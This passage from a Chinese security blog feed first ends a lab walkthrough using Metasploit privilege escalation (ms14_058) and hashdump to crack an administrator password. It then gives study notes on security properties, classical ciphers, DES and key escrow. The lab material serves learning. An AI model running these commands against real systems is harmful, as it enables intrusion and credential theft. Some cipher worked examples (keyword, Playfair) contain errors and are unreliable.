alt="18.png"></p><blockquote><p>它⾃动的为我们匹配出了⼀些可能的⽤于易受攻击⽬标提权的漏洞利⽤模块</p></blockquote></li></ul><h2 id="9-提权操作"><a href="#9-提权操作" class="headerlink" title="9. 提权操作"></a>9. 提权操作</h2><ul><li><p>使用以下命令检查提权模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bg</span></span><br><span class="line">sessions</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/yKlRjuSf4AieIZG.png" alt="19.png"></p></li><li><p><strong>提权操作</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s2.loli.net/2024/11/06/jw1dgqrkM6vGfKQ.png" alt="20.png"></p><ul><li><p>搜索并利用提权漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms14_058</span><br><span class="line">use exploit/windows/local/ms14_058_track_popup_menu</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/Q1njzmoOYVRHAli.png" alt="21.png"></p></li><li><p><strong>检查权限</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/qz1U6ZSgwWohAct.png" alt="22.png"></p></li></ul><blockquote><p>发现已经是最高权限</p></blockquote><h2 id="10-持久化攻击"><a href="#10-持久化攻击" class="headerlink" title="10. 持久化攻击"></a>10. 持久化攻击</h2><ul><li>获取 <code>administrator</code> 密码：<ul><li>使用 <code>hashdump</code> 模块提取密码 hash。<br><img src="https://s2.loli.net/2024/11/06/HlzGqJRjFn2x6pD.png" alt="23.png"><br><img src="https://s2.loli.net/2024/11/06/fOcRn4DyW9VLjsE.png" alt="24.png"><blockquote><p>已经可以看到相关账户密码加密后的hash了 </p></blockquote></li><li>将 hash 上传至 <a href="https://www.cmd5.com/">cmd5.com</a> 进行解密，得到密码为 <code>admin123</code>。<br><img src="https://s2.loli.net/2024/11/06/SCmG1Bs2thUEuVy.png" alt="25.png"></li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链安全基础一</title>
      <link href="/2024/10/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/10/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h5 id="关键词：信息安全-网络安全-（非）对称加密-密钥管理技术"><a href="#关键词：信息安全-网络安全-（非）对称加密-密钥管理技术" class="headerlink" title="关键词：信息安全  网络安全  （非）对称加密   密钥管理技术"></a>关键词：信息安全  网络安全  （非）对称加密   密钥管理技术</h5><h2 id="一-信息安全知识基础"><a href="#一-信息安全知识基础" class="headerlink" title="一. 信息安全知识基础"></a>一. 信息安全知识基础</h2><h3 id="1-1-信息安全定义-特征"><a href="#1-1-信息安全定义-特征" class="headerlink" title="1.1 信息安全定义&amp;特征"></a>1.1 信息安全定义&amp;特征</h3><h4 id="1-1-1信息安全的定义："><a href="#1-1-1信息安全的定义：" class="headerlink" title="1.1.1信息安全的定义："></a>1.1.1信息安全的定义：</h4><p>​a. 信息系统的安全（也称实体安全，系统运行的安全）</p><p>​b. 特定信息体系的安全</p><ul><li>系统中信息的安全（用户权限的限制，数据加密）</li><li>管理安全（对信息资源和系统运行的管理）</li></ul><h4 id="1-1-2信息安全的特征"><a href="#1-1-2信息安全的特征" class="headerlink" title="1.1.2信息安全的特征"></a><span style="color: red;">1.1.2信息安全的特征</span></h4><p><strong>a. 保密性</strong></p><p><strong>b. 完整性</strong></p><p><strong>c. 可用性</strong></p><p><strong>d. 可控性</strong></p><p><strong>e. 可审查性</strong></p><h4 id="关于五种特征的解释："><a href="#关于五种特征的解释：" class="headerlink" title="关于五种特征的解释："></a>关于五种特征的解释：</h4><p>（1）保密性：保密性是指信息<span style="color: blue;">不泄漏给非授权的个人、实体和过程，或供其使用的特性。</span><br>（2）完整性：完整性是指信息<span style="color: blue;">未经授权不能被修改、不被破坏、不被插入、不延迟、不乱序和不丢失的特性。</span>对网络信息安全进行攻击其最终目的就是破坏信息的完整性。<br>（3） 可用性：可用性是指合法用户访问并能<span style="color: blue;">按要求顺序使用信息的特性</span>，即保证合法用户在需要时可以访问到信息及相关资产。<br>（4）可控性：可控性是指授权机构<span style="color: blue;">对信息的内容及传播具有控制能力的特性</span>，可以控制授权范围内的信息流向以及方式。<br>（5）可审查性（抗抵赖性）：在信息交流过程结束后，通信双方<span style="color: blue;">不能抵赖曾经做出的行为，也不能否认曾经接收到对方的信息。</span></p><h3 id="1-2-网络安全的定义-特征"><a href="#1-2-网络安全的定义-特征" class="headerlink" title="1.2 网络安全的定义&amp;特征"></a>1.2 网络安全的定义&amp;特征</h3><h5 id="1-2-1-网安定义"><a href="#1-2-1-网安定义" class="headerlink" title="1.2.1 网安定义"></a>1.2.1 网安定义</h5><p>a. 硬件安全</p><p>b. 软件安全</p><p>c.系统中数据的安全</p><h5 id="1-2-2网安特征"><a href="#1-2-2网安特征" class="headerlink" title="1.2.2网安特征"></a>1.2.2网安特征</h5><p>a.保密性</p><p>b.完整性</p><p>c.可用性</p><p>d.可控性</p><h3 id="1-3-网络信息安全技术需求"><a href="#1-3-网络信息安全技术需求" class="headerlink" title="1.3 网络信息安全技术需求"></a>1.3 网络信息安全技术需求</h3><h5 id="1-3-1-网络物理安全（实体安全）"><a href="#1-3-1-网络物理安全（实体安全）" class="headerlink" title="1.3.1 网络物理安全（实体安全）"></a>1.3.1 网络物理安全（实体安全）</h5><p>​指所有支持网络系统运行的硬件总体安全。</p><p>​物理安全的需求主要有：</p><ul><li>环境安全</li><li>设备安全（物理防备）</li><li>媒体安全（媒体数据&amp;媒体本身）</li></ul><h5 id="1-3-2网络认证"><a href="#1-3-2网络认证" class="headerlink" title="1.3.2网络认证"></a>1.3.2网络认证</h5><p>​定义：实现网络资源访问控制的前提和依据。</p><p>​作用：标识，鉴别网络资源访问者身份的真实性</p><h5 id="1-3-3-网络访问控制"><a href="#1-3-3-网络访问控制" class="headerlink" title="1.3.3 网络访问控制"></a>1.3.3 网络访问控制</h5><p>​网络访问控制是有效保护网络管理对象，使其免受关键技术方法。其目标主要有两个：<br>​（1）限制非法用户获取或使用网络资源。<br>​（2） 防止合法用户滥用权限，越权访问网络资源。</p><h5 id="1-3-4网络安全保密"><a href="#1-3-4网络安全保密" class="headerlink" title="1.3.4网络安全保密"></a>1.3.4网络安全保密</h5><p>​目的： 就是防止非授权的用户访问网上信息或网络设备。</p><p>​为此，重要的网络物理实体能够采用辐射干扰机技术，防止通过电磁辐射泄露机密信息。</p><h5 id="1-3-5网络安全监测"><a href="#1-3-5网络安全监测" class="headerlink" title="1.3.5网络安全监测"></a>1.3.5网络安全监测</h5><p>​作用： 发现系统入侵活动和检查安全保护措施的有效性，以便及时报警给网安管理员</p><h5 id="1-3-6网络漏洞评估"><a href="#1-3-6网络漏洞评估" class="headerlink" title="1.3.6网络漏洞评估"></a>1.3.6网络漏洞评估</h5><p>​作用： 扫描弱点&amp;漏洞</p><h5 id="1-3-7-防范网络恶意代码"><a href="#1-3-7-防范网络恶意代码" class="headerlink" title="1.3.7 防范网络恶意代码"></a>1.3.7 防范网络恶意代码</h5><h5 id="1-3-8-网络安全应急响应"><a href="#1-3-8-网络安全应急响应" class="headerlink" title="1.3.8 网络安全应急响应"></a>1.3.8 网络安全应急响应</h5><h5 id="1-3-9-网络安全体系"><a href="#1-3-9-网络安全体系" class="headerlink" title="1.3.9 网络安全体系"></a>1.3.9 网络安全体系</h5><p>​网络安全的实现不仅仅取决于某项技术，而是依赖于一个网络信息安全体系的建立，这个体系包括安全组织机构、安全制度、安全管理流程、安全人员意识等。通过安全体系的建立，可以在最大程度上实现网络的整体安全，满足企业或单位安全发展的要求。</p><h5 id="1-4-信息安全策略"><a href="#1-4-信息安全策略" class="headerlink" title="1.4 信息安全策略"></a>1.4 信息安全策略</h5><ul><li>物理安全</li><li>访问控制</li><li>防火墙</li><li>信息加密</li><li>网络安全管理</li></ul><h5 id="1-5-相关法律"><a href="#1-5-相关法律" class="headerlink" title="1.5 相关法律"></a>1.5 相关法律</h5><h2 id="二-密码学基础"><a href="#二-密码学基础" class="headerlink" title="二. 密码学基础"></a>二. 密码学基础</h2><h3 id="2-1-密码基本知识"><a href="#2-1-密码基本知识" class="headerlink" title="2.1 密码基本知识"></a>2.1 密码基本知识</h3><p><img src="https://s2.loli.net/2024/11/03/56aczxuvg3BOFyU.jpg" alt="1.jpg"></p><h3 id="2-2-古典密码体制"><a href="#2-2-古典密码体制" class="headerlink" title="2.2 古典密码体制"></a>2.2 古典密码体制</h3><h4 id="2-2-1-单表密码"><a href="#2-2-1-单表密码" class="headerlink" title="2.2.1 单表密码"></a>2.2.1 单表密码</h4><p>（仅个人兴趣列出 非必须掌握）</p><ul><li><strong>凯撒密码</strong></li></ul><p>该算法表示为： </p><p><img src="https://s2.loli.net/2024/11/03/lOFKSTxvZR8siun.jpg" alt="2.jpg"></p><p>（c代表密文，p代表明文）</p><ul><li><p><strong>仿射密码</strong></p><p>仿射密码的主要特点是使用一个线性函数进行加密和解密。</p><p>加密过程：</p><p>在仿射密码中，字符通过以下公式进行加密：</p><p>E(x)&#x3D;(ax+b) mod  m </p><ul><li><p>E(x)：加密后的字符</p></li><li><p>x：原字符在字母表中的位置（例如，A&#x3D;0，B&#x3D;1，C&#x3D;2，…，Z&#x3D;25）</p></li><li><p>a 和 b：密钥，其中 a必须与字母表的大小 m <strong>互质</strong></p></li><li><p>m：字母表的大小（例如，对于英文字母，m&#x3D;26）</p></li></ul><p>假设我们选择 a&#x3D;5 和 b&#x3D;8，加密字母 “C”：</p><ol><li><p>C 的位置 x&#x3D;2</p></li><li><p>加密：E(2)&#x3D;(5⋅2+8)mod  26&#x3D;18</p></li><li><p>对应字母为 “S”</p></li></ol></li><li><p><strong>乘法密码</strong></p><p>加密公式为：</p><p>E(x)&#x3D;(a⋅x)mod  m</p><ul><li>E(x)：加密后的字符</li><li>x：原字符在字母表中的位置（例如，A&#x3D;0，B&#x3D;1，C&#x3D;2，…，Z&#x3D;25）</li><li>a：密钥，且必须与字母表的大小 m 互质</li><li>m：字母表的大小（对于英文字母，m&#x3D;26）</li></ul></li><li><p><strong>密钥词组密码</strong></p></li></ul><h6 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h6><ol><li><h6 id="选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。"><a href="#选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。" class="headerlink" title="选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。"></a><strong>选择密钥词组</strong>：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。</h6><p>例如，如果选择的密钥词组是 “SECURITY”，则变为 “SECURIT”（去掉重复的 “I”）。</p></li><li><h6 id="生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。"><a href="#生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。" class="headerlink" title="生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。"></a><strong>生成替代字母表</strong>：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。</h6><ul><li><p>密钥字母：S E C U R I T</p></li><li><p>剩余字母：A B D F G H J K L M N O P Q V W X Y Z</p></li><li><p>生成的替代字母表：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">S</span> <span class="built_in">E</span> <span class="built_in">C</span> <span class="variable">U</span> <span class="variable">R</span> <span class="built_in">I</span> <span class="variable">T</span> <span class="variable">A</span> <span class="variable">B</span> <span class="built_in">D</span> <span class="variable">F</span> <span class="variable">G</span> <span class="variable">H</span> <span class="variable">J</span> <span class="built_in">K</span> <span class="variable">L</span> <span class="variable">M</span> <span class="built_in">N</span> <span class="built_in">O</span> <span class="variable">P</span> <span class="variable">Q</span> <span class="variable">V</span> <span class="variable">W</span> <span class="variable">X</span> <span class="variable">Y</span> <span class="variable">Z</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>加密文本</strong>：用原字母表的字母替换为替代字母表中的字母。</p></li></ol><h4 id="2-2-2-多表密码"><a href="#2-2-2-多表密码" class="headerlink" title="2.2.2 多表密码"></a>2.2.2 多表密码</h4><p>2.2.2.1<strong>普拉斐尔密码</strong></p><h6 id="加密过程-1"><a href="#加密过程-1" class="headerlink" title="加密过程"></a>加密过程</h6><ol><li><p><strong>选择密钥</strong>：选择一个密钥词（例如 “PLAYFAIR”），去掉重复字母并将其填入一个5x5的矩阵中。</p></li><li><p><strong>填充矩阵</strong>：在密钥的基础上，依次填入剩余字母（通常将 “I” 和 “J” 合并为一个字母，矩阵中只使用一个）。</p><p>例如，使用 “PLAYFAIR” 作为密钥，矩阵为：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">P</span> <span class="variable">L</span> <span class="variable">A</span> <span class="variable">Y</span> <span class="variable">F</span></span><br><span class="line"><span class="built_in">I</span> <span class="variable">R</span> <span class="variable">B</span> <span class="built_in">C</span> <span class="built_in">D</span></span><br><span class="line"><span class="built_in">E</span> <span class="variable">G</span> <span class="variable">H</span> <span class="built_in">K</span> <span class="variable">M</span></span><br><span class="line"><span class="built_in">N</span> <span class="built_in">O</span> <span class="variable">Q</span> <span class="variable">S</span> <span class="variable">T</span></span><br><span class="line"><span class="variable">U</span> <span class="variable">V</span> <span class="variable">W</span> <span class="variable">X</span> <span class="variable">Z</span></span><br></pre></td></tr></table></figure></li><li><p><strong>准备明文</strong>：将明文按两两分组。如果有重复的字母，插入一个填充字母（通常使用 “X”）。如果最后一组只有一个字母，则在其后添加一个填充字母。</p><p>例如，明文 “HELLO” 变为 “HE LL OX”（分组为 “HE”, “LX”, “OX”）。</p></li><li><p><strong>加密规则</strong>：</p><ul><li><strong>同列</strong>：如果两个字母在同一列中，则用其下方的字母替换（循环回到顶部）。</li><li><strong>同行</strong>：如果两个字母在同一行中，则用其右边的字母替换（循环回到左边）。</li><li><strong>不同行不列</strong>：如果两个字母在矩阵的不同位置，形成一个矩形，则用矩形的对角字母替换。</li></ul><p>例如，加密 “HE”：</p><ul><li>H(第3行第3列) 和 E(第3行第1列) 形成一个矩形，加密为 “BK”。</li></ul></li><li><p><strong>重复上述步骤</strong>：对所有分组进行加密。</p><h6 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h6><p>解密过程与加密过程相反，使用相同的矩阵和规则：</p><ul><li><strong>同列</strong>：用上方的字母替换。</li><li><strong>同行</strong>：用左边的字母替换。</li><li><strong>不同行不列</strong>：用矩形的对角字母替换。</li></ul></li></ol><p>2.2.2.2 <strong>维吉尼亚密码</strong></p><h6 id="加密过程-2"><a href="#加密过程-2" class="headerlink" title="加密过程"></a>加密过程</h6><ol><li><p><strong>选择关键词</strong>：选择一个关键词（例如 “KEY”），并将其重复直到与明文长度相同。</p></li><li><p><strong>明文和关键词对齐</strong>：将明文与关键词字符逐一对齐。</p><p>例如，明文为 “HELLO WORLD”，关键词为 “KEY”，对齐后：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">H</span> <span class="built_in">E</span> <span class="variable">L</span> <span class="variable">L</span> <span class="built_in">O</span>   <span class="variable">W</span> <span class="built_in">O</span> <span class="variable">R</span> <span class="variable">L</span> <span class="built_in">D</span></span><br><span class="line"><span class="built_in">K</span> <span class="built_in">E</span> <span class="variable">Y</span> <span class="built_in">K</span> <span class="built_in">E</span>   <span class="built_in">K</span> <span class="built_in">E</span> <span class="variable">Y</span> <span class="built_in">K</span> <span class="built_in">E</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/03/bHRra7AINk1tPdD.png" alt="3.png"></p></li></ol><h6 id="解密过程-1"><a href="#解密过程-1" class="headerlink" title="解密过程"></a>解密过程</h6><p>解密过程与加密过程相似，但公式反转：</p><p><img src="https://s2.loli.net/2024/11/03/q1U9GD8TaLpnvcu.png" alt="4.png"></p><h6 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h6><p>假设明文为 “HELLO WORLD”，关键词为 “KEY”：</p><ol><li><strong>重复关键词</strong>：将 “KEY” 重复，得到 “KEYKEYKEYK”。</li><li><strong>对齐并加密</strong>：<ul><li>H (7) + K (10) &#x3D; R (17)</li><li>E (4) + E (4) &#x3D; I (8)</li><li>L (11) + Y (24) &#x3D; J (9)</li><li>L (11) + K (10) &#x3D; V (21)</li><li>O (14) + E (4) &#x3D; S (18)</li><li>空格不加密</li><li>W (22) + K (10) &#x3D; G (6)</li><li>O (14) + E (4) &#x3D; S (18)</li><li>R (17) + Y (24) &#x3D; P (15)</li><li>L (11) + K (10) &#x3D; V (21)</li><li>D (3) + E (4) &#x3D; H (7)</li></ul></li></ol><p>最终加密结果为 “RIJVS GSPVH”。</p><p>2.2.2.3 <strong>希尔密码</strong></p><p><img src="https://s2.loli.net/2024/11/03/Cq2mW3LQolaReDz.png" alt="5.png"></p><h3 id="2-3-现代密码体制"><a href="#2-3-现代密码体制" class="headerlink" title="2.3 现代密码体制"></a>2.3 现代密码体制</h3><h4 id="2-3-1-对称密码体制"><a href="#2-3-1-对称密码体制" class="headerlink" title="2.3.1 对称密码体制"></a>2.3.1 对称密码体制</h4><p>加密解密用同一把密钥 or 两把密钥之间可以推理出来</p><p><span style = "color: red;">对称加密算法的优点：</span></p><ol><li><span style = "color: red;">加，解密处理速度快</span></li><li><span style = "color: red;">保密度高</span></li></ol><p><span style = "color: red;">对称加密算法的缺点：</span></p><ol><li><span style = "color: red;">密钥分发困难</span></li><li><span style = "color: red;">密钥管理困难</span></li></ol><p><strong>举例：</strong></p><p>数据加密标准(DES)算法：</p><p><img src="https://s2.loli.net/2024/11/03/N4viyfzdRVm5ehU.jpg" alt="6.jpg"></p><p><img src="https://s2.loli.net/2024/11/03/71Kphrfctyk2iWJ.jpg" alt="7.jpg"></p><p>DES算法特点：<br>（1）分组加密算法：以64位为分组，64位一组明文输入，<br>64位密文输出。<br>（2） 对称算法：加密和解密用同一密钥。<br>（3）有效密钥长度为56位：密钥通常表示为64位数，但每个第8位都用作奇偶校验，可以忽略。<br>（4）代替和置换：DES算法是两种加密技术的组合，先代替后置换。<br>（5） 易于实现：DES算法只是使用了标准的算术和逻辑运算，其作用的数最多也只有64位，并且，算法的重复特性使得它可以非常理想地在一个专用芯片中实现</p><p><strong><span style = "color: orange;">2.3.2 非对称密码体制</span></strong></p><p>加密解密用不同密钥 or 两把密钥之间很难推理出来</p><p><span style = "color: red;">非对称加密算法的优点：</span></p><pre><code> 1. &lt;span style = &quot;color: red;&quot;&gt;密钥分发简单&lt;/span&gt; 2. &lt;span style = &quot;color: red;&quot;&gt;密钥管理便捷&lt;/span&gt; 3. &lt;span style = &quot;color: red;&quot;&gt;可以实现签名&lt;/span&gt;</code></pre><p><span style = "color: red;">非对称加密算法的缺点：</span></p><ol><li><span style = "color: red;">加密解密处理速度较慢</span></li><li><span style = "color: red;">同等安全强度下公钥密码体制的密钥位数要求多一些</span></li></ol><p><strong>举例：</strong></p><ul><li>RSA密钥生成原理</li><li>EIGamal公钥密码技术</li><li>椭圆曲线密码技术</li></ul><p>[具体解释等如果到时候我再遇到就去查了补充在这里QwQ]</p><h2 id="三-密钥管理技术"><a href="#三-密钥管理技术" class="headerlink" title="三.密钥管理技术"></a>三.密钥管理技术</h2><p><img src="https://s2.loli.net/2024/11/03/fAnc8R6hPg4VpGx.png" alt="8.png"></p><p><strong>一个完整的保密通信系统</strong></p><p>由</p><ol><li><p>密码体制（密码算法，及所有的明文，密文和密钥）</p></li><li><p>信源</p></li><li><p>信宿</p></li><li><p>攻击者</p></li></ol><p>构成。</p><p>  加解密算法一般都是公开的，所有的密码技术都依赖于密钥。当密码算法确定后，密码系统的保密程度就完全取决于密钥的保密程度。</p><p><strong>密钥管理定义</strong></p><p>密钥管理涉及密钥的产生和存储、分发、使用、更新（替换）、备份和恢复、以及撤销和销毁等，涵盖了密钥的整个生存周期。</p><h5 id="密钥管理目的"><a href="#密钥管理目的" class="headerlink" title="密钥管理目的"></a><strong>密钥管理目的</strong></h5><ol><li>确保密钥的安全性</li><li>确保密钥的有效性</li><li>密钥的分发和分享</li><li>密钥的更新和轮换</li><li>密钥的备份和恢复</li><li>监控和审计</li></ol><h3 id="3-1-密钥的类型和组织结构"><a href="#3-1-密钥的类型和组织结构" class="headerlink" title="3.1 密钥的类型和组织结构"></a>3.1 密钥的类型和组织结构</h3><h4 id="3-1-1-关于密钥长度"><a href="#3-1-1-关于密钥长度" class="headerlink" title="3.1.1 关于密钥长度"></a>3.1.1 关于密钥长度</h4><p>​密钥是安全通信的必要长度之一</p><p>长度决定因素：</p><ol><li>数据价值</li><li>所需安全期</li><li>攻击者资源情况</li><li>计算机计算能力</li><li>加密算法的发展</li></ol><h4 id="3-1-2密钥的产生与存储"><a href="#3-1-2密钥的产生与存储" class="headerlink" title="3.1.2密钥的产生与存储"></a>3.1.2密钥的产生与存储</h4><p>产生与生成算法有关：大部分采用随机或伪随机过程</p><p>存储：有无介质，记录介质，物理介质等几种</p><h4 id="3-1-3密钥的使用-更新（替换）"><a href="#3-1-3密钥的使用-更新（替换）" class="headerlink" title="3.1.3密钥的使用&amp;更新（替换）"></a>3.1.3密钥的使用&amp;更新（替换）</h4><p>密钥的使用是指从存储介质上获得密钥，进行加密和解密的技术活动。</p><p>密钥的更新和替换是指定期更换密钥，以增强系统的安全性和保护密钥的长期有效性</p><h4 id="3-1-4密钥的备份与恢复"><a href="#3-1-4密钥的备份与恢复" class="headerlink" title="3.1.4密钥的备份与恢复"></a>3.1.4密钥的备份与恢复</h4><p>备份：在密钥使用期内，存储一个受保护的拷贝，用于恢复遭到破坏的密钥</p><p>恢复：当一个密钥由于某种原因被破坏了，在还没有泄露出去以前，从它的一个备份重新得到密钥的过程 </p><h4 id="3-1-5密钥的销毁和撤销"><a href="#3-1-5密钥的销毁和撤销" class="headerlink" title="3.1.5密钥的销毁和撤销"></a>3.1.5密钥的销毁和撤销</h4><p>销毁：一般针对公钥证书所对应的密钥，撤销后密钥不再具备使用效力。</p><p><strong>自然撤销：当证书到期时</strong></p><p><strong>按需撤销</strong></p><p>密钥更换后，原来的密钥必须销毁。密钥不再使用时，该密钥所有的拷贝都必须删除，生成或构造该密钥的所有信息也应该被全部删除。</p><h3 id="3-2-密钥托管技术"><a href="#3-2-密钥托管技术" class="headerlink" title="3.2 密钥托管技术"></a>3.2 密钥托管技术</h3><p><strong>定义</strong>：提供一种密钥备份与恢复的途径，也称为托管加密</p><p><strong>实现手段</strong>：把加密的数据和数据恢复密钥联系起来，通过一个防窜扰的托管加密芯片（Clipper芯片）来实现，该技术包括两个主要的核心内容：</p><ul><li>skipjack加密算法</li><li>LEAF</li></ul><p>密钥托管技术在具体实施时有<strong>三个主要环节</strong>：生产托管Clipper芯片、用芯片加密通信、无密钥存取</p><p><strong>技术组成</strong>：USC  KEC  DRC</p><p>（这几个模块的相互关系：这几个模块的相互 关系：USC用密钥K加密明文，并且在传送的同时传送一个数据 恢复域DRF（Data Recovery Field）， DRC则从KEC提供的和DRF 中包含的信息中恢复出密钥K来解密密文。）</p><p><img src="https://s2.loli.net/2024/11/03/B2UZmvDspiuQwPE.jpg" alt="9.jpg"></p><p><strong>1.USC</strong>：<br>(1)USC: USC由软件、硬件组成(一般情况下，硬件比 软件安全、不易发生窜扰)，提供数据加密&#x2F;解密的能力，执 行支持数据恢复的操作，同时也支持密钥托管。这种支持体 <span style = "color: blue;">现在将数据恢复域(DRF)附加到数据上</span>。</p><p>USC的功能表现在以下几个方面:<br>1 提供具有数据加解密能力的算法及支持密钥托管功能的硬 件或相关软件。<br>2 提供通信(包括电话、电子邮件及其他类型的通信，由相 关部⻔在法律许可的条件下对通信的监听后执行对突发事件 的解密)和数据存储的密钥托管。<br>3 提供突发解密的识别符(包括用户或USC的识别符、密钥 的识别符、KEC或托管代理机构的识别符)和密钥(包括属 于芯片单元密钥KEC所使用的全局系统密钥，密钥还可以是 公钥或私钥，私钥的备份以托管的方式有托管机构托管)。</p><p><strong>2.KEC</strong>：<br>(2)KEC:可以作为公钥证书密钥管理系统的组成部分，也 可以作为<span style = "color: blue;">通用密钥管理的基础部分</span>。它由密钥管理机构控制， 主要用于向DRC提供所需的数据和服务，管理着<span style = "color: blue;">数据恢复密钥 的存储、传送和使用</span>。数据恢复密钥主要用于生成数据加密密 钥，因此在使用托管密码加密时，<span style = "color: blue;">所有的托管加密数据都应与 被托管的数据恢复密钥联系起来</span>。</p><p>数据恢复密钥主要由以下内容组成:</p><ul><li><p>密钥选项</p></li><li><p>密钥分割</p></li><li><p>密钥的产生和分配</p></li><li><p>密钥托管时间</p></li><li><p>密钥更新</p></li><li><p>密钥的全部和部分</p></li><li><p>密钥存储</p></li></ul><p>KEC在向DRC提供诸如托管的密钥等服务时，服务包括:<br>1 <span style = "color: blue;">授权过程</span>:对操作或使用DRC的用户进行身份认证和对访问 加密数据的授权证明。<br>2 传送数据恢复密钥(主密钥不提供):如果数据恢复密钥是 会话密钥或产品密钥，KEC向DRC直接传送数据恢复密钥。密 钥传送时和有效期一起传送，有效期过后，密钥将被自动销 毁。<br>3 传送派生密钥:KEC向DRC提供由数据恢复密钥导出的另一 密钥(派生密钥)。比如受时间限制的密钥，被加密的数据仅 能在一个特定的有效时间段内被解密。<br>4 解密密钥:如果在DRF中使用主密钥加密数据加密密钥 时，KEC只向DRC发送解密密钥，而不发送主密钥。<br>5 执行⻔限解密:每个托管机构向DRC提供自己的解密结 果，由DRC合成这些结果并得到明文。 6数据传输:KEC和DRC之间的数据传输可以是人工的也 可以是电子的。</p><p><strong>3.DRC</strong><br>(3)DRC:由算法、协议和设备组成。DRC利用KEC所提 供的和在DRF中包含的信息中<span style = "color: blue;">恢复出数据加密密钥</span>，进而解 密密文，得到明文。仅仅在执行指定的已授权的数据恢复时 使用。<br>为了解密数据，要获得数据加密密钥， DRC必须采用下列方 法来获得数据加密密钥:<br>(1)从发送方S或接收方R接入:<br>(2)与KEC交互<br>(3)穷举搜索</p><p>(1)<span style = "color: blue;">从发送方S或接收方R接入:</span></p><p>首先要确定与S或R相关的数据恢复密钥能否恢复密钥K。如果只 能利用S的托管机构持有的子密钥才能获得K，当各个用户分别向专 ⻔的用户传送消息，尤其是在多个用户散布在不同的国家或使用不 同的托管机构时，DRC一定得获取密钥托管数据后才能进行实时解 密，这是有困难的;同样，当只有利用R的托管机构所持的子密钥才 能获得K时，也不可能实时解密专⻔用户传送出的消息。如果利用托 管机构的子集所持的密钥可以进行数据恢复，那么一旦获得了K，则 DRC就可以实时解密从USC发出或送入的消息。该系统就可以为双 向实时通信提供这种能力，但这要求通信双方使用相同的K。</p><p>(2)<span style = "color: blue;">与KEC交互 </span></p><p>对于每个数据加密密钥，S或R都有可能要求DRC或KEC有一次相互作用，其中对数据加密密钥要求DRC与KEC之间的联系是 在线的，以支持当每次会话密钥改变时的实时解密。</p><p>(3)<span style = "color: blue;">穷举搜索 </span></p><p>当托管代理机构把部分密钥返回给DRC时，DRC必须使用穷举搜索以确定密钥的其余部分。<br>DRC还使用技术、操作和法律等保护手段来控制什么是可以解 密的，比如可以对数据恢复进行严格的时间限制。这些保护措施提 供了KEC传送密钥时所要求的限制，而且认证机构也可以防止DRC 用密钥产生伪消息。</p><h3 id="3-3-密钥分配方案"><a href="#3-3-密钥分配方案" class="headerlink" title="3.3 密钥分配方案"></a>3.3 密钥分配方案</h3><h4 id="3-3-1分配依据"><a href="#3-3-1分配依据" class="headerlink" title="3.3.1分配依据"></a>3.3.1分配依据</h4><ol><li><p>减轻负担，提高效率——（自动密钥分配机制）</p></li><li><p>提高安全性——减少系统中驻留的密钥量</p></li></ol><h4 id="3-3-2常用密钥分配技术"><a href="#3-3-2常用密钥分配技术" class="headerlink" title="3.3.2常用密钥分配技术"></a>3.3.2常用密钥分配技术</h4><ol><li><p>静态分配技术</p><p>静态分配技术是一种由中心以离线方式预分配的技术，是“面对面”的分发，如到银行领取信用卡密钥，它具有安全性 好的特点，是长期沿用的传统密钥管理技术，不过，它必须 解决密钥的存储技术，静态分发只能以集中式机制存在。</p></li><li><p>动态分配技术<br>动态分配技术是一种“请求一分发”的在线分发技术，如在网上申请用户密钥，它具有方便、及时的特点，但这种分配 技术需要有专门的协议的支持，动态分配技术可采用有中心 或无中心的机制。</p></li></ol><h4 id="3-3-3-密钥分配体制"><a href="#3-3-3-密钥分配体制" class="headerlink" title="3.3.3 密钥分配体制"></a>3.3.3 